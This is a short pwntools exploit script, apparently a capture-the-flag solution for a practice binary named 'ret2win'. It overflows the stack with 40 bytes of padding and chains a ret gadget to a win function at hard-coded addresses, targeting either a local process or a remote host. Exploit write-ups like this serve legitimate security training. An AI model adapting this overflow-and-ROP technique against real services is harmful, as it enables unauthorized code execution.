from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./ret2win")


class ROP_Gadget:
    ret = 0x000040053e
    easy = 0x0000400756


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.ret,
        ROP_Gadget.easy
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()